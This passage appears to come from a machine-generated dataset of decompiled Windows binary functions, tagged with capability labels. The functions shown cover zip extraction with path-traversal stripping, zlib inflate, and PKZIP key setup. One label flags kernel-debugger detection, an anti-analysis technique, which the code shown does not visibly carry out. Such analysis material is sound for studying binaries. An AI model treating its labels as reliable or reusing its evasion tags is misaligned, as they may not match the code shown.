uStack616 = CONCAT44(uStack616._4_4_, uStack616);\n                    if (pcVar14[1] == '\\0') goto code_r0x00407b57;\n                    (**0x45fe48)(*(pcVar14 + 4), *(pcVar14 + 0xc) + uStack636, 0, 0);\n                }\n                uVar2 = uStack632;\n                iVar9 = fcn.00426941(uStack632);\n                uVar4 = fcn.00406940(iVar9, 1, uVar2, **param_1);\n                if (uVar4 == uVar2) {\n                    *param_3 = *(*param_1 + 0x10);\n                    iVar5 = 0;\n                    do {\n                        pcVar14 = acStack524 + iVar5;\n                        acStack264[iVar5] = *pcVar14;\n                        iVar5 = iVar5 + 1;\n                    } while (*pcVar14 != '\\0');\n                    pcVar14 = acStack264;\n                    while( true ) {\n                        while( true ) {\n                            while( true ) {\n                                while( true ) {\n                                    while( true ) {\n                                        while( true ) {\n                                            for (; (cVar1 = *pcVar14,  cVar1 != '\\0' && (pcVar14[1] == ':'));\n                                                pcVar14 = pcVar14 + 2) {\n                                            }\n                                            if (cVar1 != '\\\\') break;\n                                            pcVar14 = pcVar14 + 1;\n                                        }\n                                        if (cVar1 != '/') break;\n                                        pcVar14 = pcVar14 + 1;\n                                    }\n                                    iVar5 = fcn.0042867f(pcVar14, \"\\\\..\\\\\");\n                                    if (iVar5 == 0) break;\n                                    pcVar14 = iVar5 + 4;\n                                }\n                                iVar5 = fcn.0042867f(pcVar14, \"\\\\../\");\n                                if (iVar5 == 0) break;\n                                pcVar14 = iVar5 + 4;\n                            }\n                            iVar5 = fcn.0042867f(pcVar14, \"/../\");\n                            if (iVar5 == 0) break;\n                            pcVar14 = iVar5 + 4;\n                        }\n                        iVar5 = fcn.0042867f(pcVar14, \"/..\\\\\");\n                        uVar8 = in_stack_fffffd80;\n                        if (iVar5 == 0) break;\n                        pcVar14 = iVar5 + 4;\n                    }\n                    fcn.0042853b(param_3 + 1, pcVar14, 0x104);\n                    uVar11 = ~(uStack552 >> 0x17);\n                    auStack604[0] = auStack604[0] >> 8;\n                    iVar5 = 0;\n                    uVar12 = uStack552 >> 0x1e;\n                    in_stack_fffffd80 = CONCAT13(1, uVar8);\n                    uVar3 = 1;\n                    if ((((auStack604[0] == 0) || (auStack604[0] == 7)) || (auStack604[0] == 0xb)) ||\n                       (auStack604[0] == 0xe)) {\n                        in_stack_fffffd80 = (uVar8 | (uStack552 >> 2) << 0x10) & 0xff01ffff | 0x1000000;\n                        uVar11 = uStack552;\n                        uVar8 = uStack552 >> 1 & 1;\n                        uVar12 = uStack552 >> 4;\n                        uVar3 = uStack552 >> 5 & 1;\n                    }\n                    else {\n                        uVar8 = 0;\n                    }\n                    param_3[0x42] = 0;\n                    if ((uVar12 & 1) != 0) {\n                        param_3[0x42] = 0x10;\n                    }\n                    if (uVar3 != 0) {\n                        param_3[0x42] = param_3[0x42] | 0x20;\n                    }\n                    if (uVar8 != 0) {\n                        param_3[0x42] = param_3[0x42] | 2;\n                    }\n                    if ((uVar11 & 1) != 0) {\n                        param_3[0x42] = param_3[0x42] | 1;\n                    }\n                    if (in_stack_fffffd80 >> 0x10 != '\\0') {\n                        param_3[0x42] = param_3[0x42] | 4;\n                    }\n                    param_3[0x4a] = iStack576;\n                    param_3[0x49] = iStack580;\n                    uStack616 = fcn.00405580(uStack588 >> 0x10, uStack588);\n                    (**0x45ffa8)(&uStack616, &iStack624);\n                    param_3[0x43] = iStack624;\n                    param_3[0x44] = iStack620;\n                    param_3[0x45] = iStack624;\n                    param_3[0x46] = iStack620;\n                    param_3[0x47] = iStack624;\n                    param_3[0x48] = iStack620;\n                    if (4 < uStack632) {\n                        uStack636 = uStack636 & 0xff000000;\n                        do {\n                            uStack636._0_2_ = CONCAT11(*(iVar9 + 1 + iVar5), *(iVar5 + iVar9));\n                            uStack636 = uStack636 & 0xffff0000 | uStack636;\n                            puVar10 = 0x444610;\n                            puVar6 = &uStack636;\n                            do {\n                                uVar8 = *puVar6;\n                                bVar15 = uVar8 < *puVar10;\n                                if (uVar8 != *puVar10) {\ncode_r0x004079f8:\n                                    iVar7 = (1 - bVar15) - (bVar15 != 0);\n                                    goto code_r0x004079fd;\n                                }\n                                if (uVar8 == 0) break;\n                                uVar8 = *(puVar6 + 1);\n                                bVar15 = uVar8 < puVar10[1];\n                                if (uVar8 != puVar10[1]) goto code_r0x004079f8;\n                                puVar6 = puVar6 + 2;\n                                puVar10 = puVar10 + 2;\n                            } while (uVar8 != 0);\n                            iVar7 = 0;\ncode_r0x004079fd:\n                            if (iVar7 == 0) {\n                                uVar8 = *(iVar5 + 4 + iVar9);\n                                in_stack_fffffd80 =\n                                     in_stack_fffffd80 & 0xffff0000 |\n                                     CONCAT11(uVar8 >> 2, in_stack_fffffd80) & 0xffff01ff;\n                                if ((uVar8 & 1) != 0) {\n                                    uVar16 = fcn.004286a0();\n                                    param_3[0x47] = uVar16;\n                                    param_3[0x48] = uVar16 >> 0x20;\n                                }\n                                if ((uVar8 >> 1 & 1) != 0) {\n                                    uVar16 = fcn.004286a0();\n                                    param_3[0x43] = uVar16;\n                                    param_3[0x44] = uVar16 >> 0x20;\n                                }\n                                if (in_stack_fffffd80 >> 8 != '\\0') {\n                                    uVar16 = fcn.004286a0();\n                                    param_3[0x45] = uVar16;\n                                    param_3[0x46] = uVar16 >> 0x20;\n                                }\n                                break;\n                            }\n                            iVar5 = iVar5 + 4 + *(iVar5 + 2 + iVar9);\n                        } while (iVar5 + 4U < uStack632);\n                    }\n                    if (iVar9 != 0) {\n                        fcn.00428714(iVar9);\n                    }\n                    piVar13 = piStack628 + 2;\n                    for (iVar9 = 0x4b; iVar9 != 0; iVar9 = iVar9 + -1) {\n                        *piVar13 = *param_3;\n                        param_3 = param_3 + 1;\n                        piVar13 = piVar13 + 1;\n                    }\n                    piStack628[0x4d] = param_2;\n                }\n                else {\n                    fcn.00428714(iVar9);\n                }\n            }\n            goto code_r0x00407b57;\n        }\n        *param_3 = *(*param_1 + 4);\n        *(param_3 + 1) = 0;\n        param_3[0x42] = 0;\n        param_3[0x43] = 0;\n        param_3[0x44] = 0;\n        param_3[0x45] = 0;\n        param_3[0x46] = 0;\n        param_3[0x47] = 0;\n        param_3[0x48] = 0;\n        param_3[0x49] = 0;\n        param_3[0x4a] = 0;\n        uStack616 = CONCAT44(uStack616._4_4_, uStack616);\n    }\ncode_r0x00407b57:\n    fcn.00427841(in_stack_fffffd80);\n    return;\n}\n",
        "token_count": 2951
    },
    "00408340": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00408340(uint32_t *param_1, uint8_t **param_2, int32_t param_3)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint32_t *puVar5;\n    uint8_t **ppuVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint *puVar10;\n    int32_t iVar11;\n    uint8_t uVar12;\n    uint32_t uVar13;\n    uint8_t *arg_ch;\n    uint32_t uVar14;\n    uint8_t *puStack32;\n    uint8_t *puStack28;\n    uint8_t *puStack24;\n    int32_t iStack20;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    ppuVar6 = param_2;\n    puVar5 = param_1;\n    puStack32 = param_2[1];\n    arg_ch = *param_2;\n    puVar3 = param_1[0xd];\n    uVar14 = param_1[7];\n    if (puVar3 < param_1[0xc]) {\n        puStack24 = param_1[0xc] + (-1 - puVar3);\n    }\n    else {\n        puStack24 = param_1[0xb] - puVar3;\n    }\n    uVar13 = *param_1;\n    uVar8 = param_1[8];\n    uVar7 = param_1[8];\n    do {\n        param_1 = puVar3;\n        param_2 = uVar7;\n        if (9 < uVar13) {\n            param_3 = -2;\ncode_r0x00408393:\n            puVar5[8] = param_2;\ncode_r0x0040839a:\n            puVar5[7] = uVar14;\n            ppuVar6[1] = puStack32;\ncode_r0x004083a4:\n            ppuVar6[2] = ppuVar6[2] + (arg_ch - *ppuVar6);\n            *ppuVar6 = arg_ch;\n            puVar5[0xd] = param_1;\n            fcn.00405610(puVar5, ppuVar6, param_3);\n            return;\n        }\n    // switch table (10 cases) at 0x408d50\n        switch(*(uVar13 * 4 + 0x408d50)) {\n        case 0x4083db:\n            iVar11 = param_3;\n            for (; uVar7 = uVar8,  uVar14 < 3; uVar14 = uVar14 + 8) {\n                if (puStack32 == NULL) {\n                    puVar5[8] = param_2;\n                    puVar5[7] = uVar14;\n                    ppuVar6[1] = NULL;\n                    goto code_r0x00408a90;\n                }\n                uVar2 = *arg_ch;\n                puStack32 = puStack32 + -1;\n                arg_ch = arg_ch + 1;\n                param_3 = 0;\n                param_2 = uVar7 | uVar2 << (uVar14 & 0x1f);\n                uVar8 = param_2;\n                iVar11 = param_3;\n            }\n            puVar5[6] = uVar7 & 1;\n            param_3 = iVar11;\n    // switch table (4 cases) at 0x408d78\n            switch((uVar7 & 7) >> 1) {\n            case 0:\n                uVar13 = uVar14 - 3 & 7;\n                uVar7 = (uVar7 >> 3) >> uVar13;\n                uVar14 = (uVar14 - 3) - uVar13;\n                *puVar5 = 1;\n                param_2 = uVar7;\n                break;\n            case 1:\n                uVar13 = fcn.00405710(9, 5, 0x442c40, 0x443c40, ppuVar6);\n                puVar5[1] = uVar13;\n                if (uVar13 == 0) {\n                    param_3 = -4;\n                    goto code_r0x00408393;\n                }\n                uVar7 = param_2 >> 3;\n                uVar14 = uVar14 - 3;\n                *puVar5 = 6;\n                param_2 = uVar7;\n                break;\n            case 2:\n                uVar7 = uVar7 >> 3;\n                uVar14 = uVar14 - 3;\n                *puVar5 = 3;\n                param_2 = uVar7;\n                break;\n            case 3:\n                *puVar5 = 9;\n                ppuVar6[6] = \"invalid block type\";\n                puVar5[8] = param_2 >> 3;\n                uVar14 = uVar14 - 3;\n                param_3 = -3;\n                goto code_r0x0040839a;\n            }\n            break;\n        case 0x408495:\n            for (; uVar14 < 0x20; uVar14 = uVar14 + 8) {\n                if (puStack32 == NULL) goto code_r0x00408adb;\n                uVar2 = *arg_ch;\n                puStack32 = puStack32 + -1;\n                arg_ch = arg_ch + 1;\n                param_3 = 0;\n                uVar8 = uVar8 | uVar2 << (uVar14 & 0x1f);\n                param_2 = uVar8;\n            }\n            uVar13 = uVar8 & 0xffff;\n            if (~uVar8 >> 0x10 != uVar13) {\n                *puVar5 = 9;\n                ppuVar6[6] = \"invalid stored block lengths\";\n                goto code_r0x00408b03;\n            }\n            uVar7 = 0;\n            uVar14 = 0;\n            puVar5[1] = uVar13;\n            param_2 = NULL;\n            if (uVar13 == 0) {\n                *puVar5 = -(puVar5[6] != 0) & 7;\n            }\n            else {\n                *puVar5 = 2;\n            }\n            break;\n        case 0x40850f:\n            if (puStack32 == NULL) {\ncode_r0x00408b38:\n                puVar5[8] = param_2;\n                puVar5[7] = uVar14;\n                ppuVar6[2] = ppuVar6[2] + (arg_ch - *ppuVar6);\n                ppuVar6[1] = NULL;\n                *ppuVar6 = arg_ch;\n                puVar5[0xd] = puVar3;\n                fcn.00405610(puVar5, ppuVar6, param_3);\n                return;\n            }\n            if (puStack24 == NULL) {\n                if (puVar3 == puVar5[0xb]) {\n                    puVar4 = puVar5[0xc];\n                    param_1 = puVar5[10];\n                    if (param_1 != puVar4) {\n                        if (param_1 < puVar4) {\n                            puStack24 = puVar4 + (-1 - param_1);\n                        }\n                        else {\n                            puStack24 = puVar5[0xb] + -param_1;\n                        }\n                        puVar3 = param_1;\n                        if (puStack24 != NULL) goto code_r0x004085be;\n                    }\n                }\n                param_1 = puVar3;\n                puVar5[0xd] = param_1;\n                iVar11 = fcn.00405610(puVar5, ppuVar6, param_3);\n                puVar3 = puVar5[0xc];\n                param_1 = puVar5[0xd];\n                if (param_1 < puVar3) {\n                    puStack24 = puVar3 + (-1 - param_1);\n                }\n                else {\n                    puStack24 = puVar5[0xb] - param_1;\n                }\n                if (param_1 == puVar5[0xb]) {\n                    puVar4 = puVar5[10];\n                    if (puVar4 != puVar3) {\n                        param_1 = puVar4;\n                        if (puVar4 < puVar3) {\n                            puStack24 = puVar3 + (-1 - puVar4);\n                        }\n                        else {\n                            puStack24 = puVar5[0xb] - puVar4;\n                        }\n                    }\n                }\n                if (puStack24 == NULL) {\n                    puVar5[8] = uVar7;\n                    puVar5[7] = uVar14;\n                    ppuVar6[1] = puStack32;\n                    goto code_r0x00408a90;\n                }\n            }\ncode_r0x004085be:\n            param_3 = 0;\n            puStack28 = puVar5[1];\n            if (puStack32 < puVar5[1]) {\n                puStack28 = puStack32;\n            }\n            if (puStack24 < puStack28) {\n                puStack28 = puStack24;\n            }\n            fcn.004274e0(param_1, arg_ch, puStack28);\n            puStack32 = puStack32 + -puStack28;\n            param_1 = param_1 + puStack28;\n            puStack24 = puStack24 + -puStack28;\n            arg_ch = arg_ch + puStack28;\n            puVar1 = puVar5 + 1;\n            *puVar1 = *puVar1 - puStack28;\n            if (*puVar1 == 0) {\n                *puVar5 = -(puVar5[6] != 0) & 7;\n            }\n            break;\n        case 0x408626:\n            for (; uVar14 < 0xe; uVar14 = uVar14 + 8) {\n                if (puStack32 == NULL) goto code_r0x00408b38;\n                uVar2 = *arg_ch;\n                puStack32 = puStack32 + -1;\n                arg_ch = arg_ch + 1;\n                param_3 = 0;\n                uVar8 = uVar8 | uVar2 << (uVar14 & 0x1f);\n                param_2 = uVar8;\n            }\n            puVar5[1] = uVar8 & 0x3fff;\n            if ((0x1d < (uVar8 & 0x1f)) || (uVar13 = (uVar8 & 0x3fff) >> 5 & 0x1f,  0x1d < uVar13)) {\n                *puVar5 = 9;\n                ppuVar6[6] = \"too many length or distance symbols\";\n                goto code_r0x00408b03;\n            }\n            uVar13 = (*ppuVar6[8])(ppuVar6[10], uVar13 + 0x102 + (uVar8 & 0x1f), 4);\n            puVar5[3] = uVar13;\n            if (uVar13 == 0) {\n                puVar5[8] = param_2;\n                puVar5[7] = uVar14;\n                ppuVar6[2] = ppuVar6[2] + (arg_ch - *ppuVar6);\n                ppuVar6[1] = puStack32;\n                *ppuVar6 = arg_ch;\n                puVar5[0xd] = puVar3;\n                fcn.00405610(puVar5, ppuVar6, 0xfffffffc);\n                return;\n            }\n            uVar8 = param_2 >> 0xe;\n            uVar14 = uVar14 - 0xe;\n            puVar5[2] = 0;\n            *puVar5 = 4;\n            param_2 = uVar8;\n        case 0x4086bd:\n            if (puVar5[2] < (puVar5[1] >> 10) + 4) {\n                do {\n                    for (; uVar14 < 3; uVar14 = uVar14 + 8) {\n                        if (puStack32 == NULL) goto code_r0x00408b38;\n                        uVar2 = *arg_ch;\n                        puStack32 = puStack32 + -1;\n                        arg_ch = arg_ch + 1;\n                        param_3 = 0;\n                        param_2 = uVar8 | uVar2 << (uVar14 & 0x1f);\n                        uVar8 = param_2;\n                    }\n                    *(puVar5[3] + *(puVar5[2] * 4 + 0x443d58) * 4) = uVar8 & 7;\n                    puVar5[2] = puVar5[2] + 1;\n                    param_2 = param_2 >> 3;\n                    uVar14 = uVar14 - 3;\n                    uVar8 = param_2;\n                } while (puVar5[2] < (puVar5[1] >> 10) + 4);\n            }\n            uVar13 = puVar5[2];\n            while (uVar13 < 0x13) {\n                *(puVar5[3] + *(puVar5[2] * 4 + 0x443d58) * 4) = 0;\n                puVar5[2] = puVar5[2] + 1;\n                uVar13 = puVar5[2];\n            }\n            puVar5[4] = 7;\n            iVar11 = fcn.00405e00(puVar5[3], puVar5 + 4, puVar5 + 5, puVar5[9], ppuVar6);\n            if (iVar11 != 0) {\n                if (iVar11 == -3) {\n                    (*ppuVar6[9])(ppuVar6[10], puVar5[3]);\n                    *puVar5 = 9;\n                }\n                puVar5[8] = param_2;\n                puVar5[7] = uVar14;\n                ppuVar6[1] = puStack32;\ncode_r0x00408a90:\n                ppuVar6[2] = ppuVar6[2] + (arg_ch - *ppuVar6);\n                *ppuVar6 = arg_ch;\n                puVar5[0xd] = param_1;\n                fcn.00405610(puVar5, ppuVar6, iVar11);\n                return;\n            }\n            puVar5[2] = 0;\n            *puVar5 = 5;\n            uVar8 = param_2;\ncode_r0x00408795:\n            if (puVar5[2] < (puVar5[1] >> 5 & 0x1f) + 0x102 + (puVar5[1] & 0x1f)) {\n                do {\n                    uVar13 = puVar5[4];\n                    if (uVar14 < uVar13) {\n                        do {\n                            if (puStack32 == NULL) goto code_r0x00408b38;\n                            uVar2 = *arg_ch;\n                            puStack32 = puStack32 + -1;\n                            uVar12 = uVar14;\n                            uVar13 = puVar5[4];\n                            uVar14 = uVar14 + 8;\n                            arg_ch = arg_ch + 1;\n                            uVar8 = uVar8 | uVar2 << (uVar12 & 0x1f);\n                            param_3 = 0;\n                            param_2 = uVar8;\n                        } while (uVar14 < uVar13);\n                    }\n                    iVar11 = puVar5[5] + (*(uVar13 * 4 + 0x442be0) & uVar8) * 8;\n                    uVar2 = *(iVar11 + 1);\n                    uVar13 = uVar2;\n                    uStack12 = *(iVar11 + 4);\n                    if (uStack12 < 0x10) {\n                        param_2 = uVar8 >> (uVar2 & 0x1f);\n                        uVar14 = uVar14 - uVar13;\n                        *(puVar5[3] + puVar5[2] * 4) = uStack12;\n                        puVar5[2] = puVar5[2] + 1;\n                    }\n                    else {\n                        if (uStack12 == 0x12) {\n                            iStack20 = 7;\n                        }\n                        else {\n                            iStack20 = uStack12 - 0xe;\n                        }\n                        puStack24 = (uStack12 == 0x12) * 8 + 3;\n                        uStack16 = uVar13 + iStack20;\n                        for (; uVar14 < uStack16; uVar14 = uVar14 + 8) {\n                            if (puStack32 == NULL) goto code_r0x00408adb;\n                            uVar12 = *arg_ch;\n                            puStack32 = puStack32 + -1;\n                            arg_ch = arg_ch + 1;\n                            param_3 = 0;\n                            uVar8 = uVar8 | uVar12 << (uVar14 & 0x1f);\n                            param_2 = uVar8;\n                        }\n                        uVar8 = uVar8 >> (uVar2 & 0x1f);\n                        puStack24 = puStack24 + (*(iStack20 * 4 + 0x442be0) & uVar8);\n                        param_2 = uVar8 >> (iStack20 & 0x1f);\n                        uVar14 = uVar14 - (iStack20 + uVar13);\n                        uVar13 = puVar5[2];\n                        if ((puVar5[1] >> 5 & 0x1f) + 0x102 + (puVar5[1] & 0x1f) < puStack24 + uVar13) {\ncode_r0x00408c04:\n                            (*ppuVar6[9])(ppuVar6[10], puVar5[3]);\n                            *puVar5 = 9;\n                            ppuVar6[6] = \"invalid bit length repeat\";\n                            puVar5[8] = param_2;\n                            puVar5[7] = uVar14;\n                            ppuVar6[2] = ppuVar6[2] + (arg_ch - *ppuVar6);\n                            ppuVar6[1] = puStack32;\n                            *ppuVar6 = arg_ch;\n                            puVar5[0xd] = puVar3;\n                            fcn.00405610(puVar5, ppuVar6, 0xfffffffd);\n                            return;\n                        }\n                        if (uStack12 == 0x10) {\n                            if (uVar13 == 0) goto code_r0x00408c04;\n                            uVar9 = *((puVar5[3] - 4) + uVar13 * 4);\n                        }\n                        else {\n                            uVar9 = 0;\n                        }\n                        do {\n                            *(puVar5[3] + uVar13 * 4) = uVar9;\n                            uVar13 = uVar13 + 1;\n                            puStack24 = puStack24 + -1;\n                        } while (puStack24 != NULL);\n                        puVar5[2] = uVar13;\n                    }\n                    uVar8 = param_2;\n                } while (puVar5[2] < (puVar5[1] >> 5 & 0x1f) + 0x102 + (puVar5[1] & 0x1f));\n            }\n            puVar5[5] = 0;\n            iStack20 = 9;\n            puStack24 = 0x6;\n            iVar11 = fcn.00405ea0((puVar5[1] & 0x1f) + 0x101, (puVar5[1] >> 5 & 0x1f) + 1, puVar5[3], &iStack20, \n                                  &puStack24, &uStack8, &uStack4, puVar5[9], ppuVar6);\n            if (iVar11 != 0) {\n                if (iVar11 == -3) {\n                    (*ppuVar6[9])(ppuVar6[10], puVar5[3]);\n                    *puVar5 = 9;\n                }\n                puVar5[8] = param_2;\n                puVar5[7] = uVar14;\n                ppuVar6[1] = puStack32;\n                param_3 = iVar11;\n                goto code_r0x004083a4;\n            }\n            puVar10 = (*ppuVar6[8])(ppuVar6[10], 1, 0x1c);\n            if (puVar10 == NULL) {\n                puVar5[8] = param_2;\n                puVar5[7] = uVar14;\n                ppuVar6[2] = ppuVar6[2] + (arg_ch - *ppuVar6);\n                ppuVar6[1] = puStack32;\n                *ppuVar6 = arg_ch;\n                puVar5[0xd] = puVar3;\n                fcn.00405610(puVar5, ppuVar6, 0xfffffffc);\n                return;\n            }\n            *(puVar10 + 4) = iStack20;\n            *(puVar10 + 0x11) = puStack24._0_1_;\n            *puVar10 = 0;\n            puVar10[5] = uStack8;\n            puVar10[6] = uStack4;\n            puVar5[1] = puVar10;\n            (*ppuVar6[9])(ppuVar6[10], puVar5[3]);\n            *puVar5 = 6;\ncode_r0x004089d7:\n            puVar5[8] = param_2;\n            puVar5[7] = uVar14;\n            ppuVar6[1] = puStack32;\n            ppuVar6[2] = ppuVar6[2] + (arg_ch - *ppuVar6);\n            *ppuVar6 = arg_ch;\n            puVar5[0xd] = puVar3;\n            iVar11 = fcn.00407cd0(puVar5, ppuVar6, param_3);\n            if (iVar11 != 1) {\n                fcn.00405610(puVar5, ppuVar6, iVar11);\n                return;\n            }\n            param_3 = 0;\n            (*ppuVar6[9])(ppuVar6[10], puVar5[1]);\n            uVar7 = puVar5[8];\n            param_1 = puVar5[0xd];\n            puStack32 = ppuVar6[1];\n            arg_ch = *ppuVar6;\n            uVar14 = puVar5[7];\n            if (param_1 < puVar5[0xc]) {\n                puStack24 = puVar5[0xc] + (-1 - param_1);\n            }\n            else {\n                puStack24 = puVar5[0xb] - param_1;\n            }\n            param_2 = uVar7;\n            if (puVar5[6] != 0) {\n                *puVar5 = 7;\ncode_r0x00408cd9:\n                puVar5[0xd] = param_1;\n                param_3 = fcn.00405610(puVar5, ppuVar6, param_3);\n                param_1 = puVar5[0xd];\n                if (puVar5[0xc] == param_1) {\n                    *puVar5 = 8;\ncode_r0x00408d18:\n                    puVar5[8] = param_2;\n                    puVar5[7] = uVar14;\n                    ppuVar6[2] = ppuVar6[2] + (arg_ch - *ppuVar6);\n                    ppuVar6[1] = puStack32;\n                    *ppuVar6 = arg_ch;\n                    puVar5[0xd] = param_1;\n                    fcn.00405610(puVar5, ppuVar6, 1);\n                    return;\n                }\n                puVar5[8] = param_2;\n                puVar5[7] = uVar14;\n                ppuVar6[1] = puStack32;\n                goto code_r0x004083a4;\n            }\n            *puVar5 = 0;\n            break;\n        case 0x408795:\n            goto code_r0x00408795;\n        case 0x4089d7:\n            goto code_r0x004089d7;\n        case 0x408b03:\ncode_r0x00408b03:\n            puVar5[8] = param_2;\n            puVar5[7] = uVar14;\n            ppuVar6[2] = ppuVar6[2] + (arg_ch - *ppuVar6);\n            ppuVar6[1] = puStack32;\n            *ppuVar6 = arg_ch;\n            puVar5[0xd] = puVar3;\n            fcn.00405610(puVar5, ppuVar6, 0xfffffffd);\n            return;\n        case 0x408cd9:\n            goto code_r0x00408cd9;\n        case 0x408d18:\n            goto code_r0x00408d18;\n        }\n        uVar13 = *puVar5;\n        puVar3 = param_1;\n        uVar8 = uVar7;\n        uVar7 = param_2;\n    } while( true );\ncode_r0x00408adb:\n    puVar5[8] = param_2;\n    puVar5[7] = uVar14;\n    ppuVar6[1] = NULL;\n    goto code_r0x004083a4;\n}\n",
        "token_count": 5824
    },
    "00409360": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint fcn.00409360(int32_t *param_1, char *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *arg_8h;\n    char *pcVar3;\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    piVar1 = param_1;\n    if ((param_1 == NULL) || (param_1[6] == 0)) {\n        return 0xffffff9a;\n    }\n    if (param_1[0x1f] != 0) {\n        fcn.00407550(param_1);\n    }\n    iVar2 = fcn.00407360(piVar1, &iStack4, &param_1, &iStack8);\n    if (iVar2 == 0) {\n        arg_8h = fcn.0042740a(0x84);\n        if (arg_8h != NULL) {\n            iVar2 = fcn.0042740a(0x4000);\n            *arg_8h = iVar2;\n            arg_8h[0x11] = param_1;\n            arg_8h[0x12] = iStack8;\n            arg_8h[0x13] = 0;\n            if (iVar2 != 0) {\n                arg_8h[0x10] = 0;\n                iVar2 = piVar1[0xd];\n                arg_8h[0x15] = piVar1[0xf];\n                arg_8h[0x14] = 0;\n                arg_8h[0x19] = piVar1[0xd];\n                arg_8h[0x18] = *piVar1;\n                arg_8h[0x1a] = piVar1[3];\n                arg_8h[6] = 0;\n                if (iVar2 != 0) {\n                    arg_8h[9] = 0;\n                    arg_8h[10] = 0;\n                    arg_8h[0xb] = 0;\n                    iVar2 = fcn.00406770(arg_8h + 1);\n                    if (iVar2 == 0) {\n                        arg_8h[0x10] = 1;\n                    }\n                }\n                arg_8h[0x16] = piVar1[0x10];\n                arg_8h[0x17] = piVar1[0x11];\n                *(arg_8h + 0x1b) = *(piVar1 + 0xc) & 1;\n                if ((piVar1[0xc] >> 3 & 1) == 0) {\n                    *(arg_8h + 0x20) = *(piVar1 + 0x3f);\n                }\n                else {\n                    *(arg_8h + 0x20) = *(piVar1 + 0x39);\n                }\n                arg_8h[0x1f] = -(*(arg_8h + 0x1b) != '\\0') & 0xc;\n                arg_8h[0x1c] = 0x12345678;\n                arg_8h[0x1d] = 0x23456789;\n                arg_8h[0x1e] = 0x34567890;\n                for (pcVar3 = param_2; (pcVar3 != NULL && (*pcVar3 != '\\0')); pcVar3 = pcVar3 + 1) {\n                    fcn.004064a0(arg_8h + 0x1c, *pcVar3);\n                }\n                arg_8h[0xf] = piVar1[0x1e] + 0x1e + iStack4;\n                arg_8h[2] = 0;\n                piVar1[0x1f] = arg_8h;\n                return 0;\n            }\n            fcn.0042749e(arg_8h);\n        }\n        return 0xffffff98;\n    }\n    return 0xffffff99;\n}\n",
        "token_count": 900
    },
    "00409840": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00409840(int32_t *param_1, int32_t param_2, char *param_3, uint param_4, int32_t param_5)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    uint unaff_ESI;\n    uchar auStack832 [3];\n    char acStack829 [5];\n    uchar auStack824 [256];\n    uint32_t uStack568;\n    uchar auStack564 [8];\n    uchar auStack556 [8];\n    uchar auStack548 [16];\n    char acStack532 [260];\n    uchar auStack272 [268];\n    uint32_t uStack4;\n    \n    uStack4 = *0x44d6a0 ^ auStack832;\n    if (param_5 == 3) {\n        if (param_2 != param_1[1]) {\n            if (param_1[1] != -1) {\n                fcn.00407550(*param_1);\n            }\n            iVar5 = *param_1;\n            param_1[1] = -1;\n            if (*(iVar5 + 4) <= param_2) goto code_r0x00409be8;\n            if (param_2 < *(iVar5 + 0x10)) {\n                fcn.00407170(iVar5);\n            }\n            iVar5 = *(*param_1 + 0x10);\n            while (iVar5 < param_2) {\n                fcn.004071c0(*param_1);\n                iVar5 = *(*param_1 + 0x10);\n            }\n            fcn.00409360(*param_1, param_1[0x4e]);\n            param_1[1] = param_2;\n        }\n        iVar5 = fcn.004094f0(*param_1, param_3, param_4, acStack829);\n        if (iVar5 < 1) {\n            fcn.00407550(*param_1);\n            param_1[1] = -1;\n        }\n        goto code_r0x00409be8;\n    }\n    if ((param_5 != 2) && (param_5 != 1)) goto code_r0x00409be8;\n    if (param_1[1] != -1) {\n        fcn.00407550(*param_1);\n    }\n    iVar5 = *param_1;\n    param_1[1] = -1;\n    if (*(iVar5 + 4) <= param_2) goto code_r0x00409be8;\n    if (param_2 < *(iVar5 + 0x10)) {\n        fcn.00407170(iVar5);\n    }\n    iVar5 = *(*param_1 + 0x10);\n    while (iVar5 < param_2) {\n        iVar5 = *param_1;\n        if (((iVar5 != 0) && (*(iVar5 + 0x18) != 0)) && (iVar3 = *(iVar5 + 0x10) + 1,  iVar3 != *(iVar5 + 4))) {\n            *(iVar5 + 0x14) = *(iVar5 + 0x14) + *(iVar5 + 0x50) + *(iVar5 + 0x4c) + 0x2e + *(iVar5 + 0x48);\n            *(iVar5 + 0x10) = iVar3;\n            iVar3 = fcn.00406db0(iVar5, iVar5 + 0x28, iVar5 + 0x78, 0, 0, 0, 0, 0, 0);\n            *(iVar5 + 0x18) = iVar3 == 0;\n        }\n        iVar5 = *(*param_1 + 0x10);\n    }\n    fcn.00407640(param_2, auStack824);\n    if ((uStack568 >> 4 & 1) != 0) goto code_r0x00409be8;\n    auStack272[0] = 0;\n    pcVar4 = param_3;\n    if (param_5 != 1) {\n        cVar2 = *param_3;\n        pcVar7 = param_3;\n        while (cVar2 != '\\0') {\n            if ((cVar2 == '/') || (cVar2 == '\\\\')) {\n                pcVar4 = pcVar7 + 1;\n            }\n            pcVar1 = pcVar7 + 1;\n            pcVar7 = pcVar7 + 1;\n            cVar2 = *pcVar1;\n        }\n        fcn.0042853b(acStack532, param_3, 0x104);\n        if (pcVar4 == param_3) {\n            acStack532[0] = '\\0';\ncode_r0x00409a75:\n            (**0x45fdec)(auStack272, 0x44461c, param_1 + 0x50, acStack532, pcVar4);\n        }\n        else {\n            pcVar4[acStack532 + -param_3] = '\\0';\n            if (((acStack532[0] != '/') && (acStack532[0] != '\\\\')) &&\n               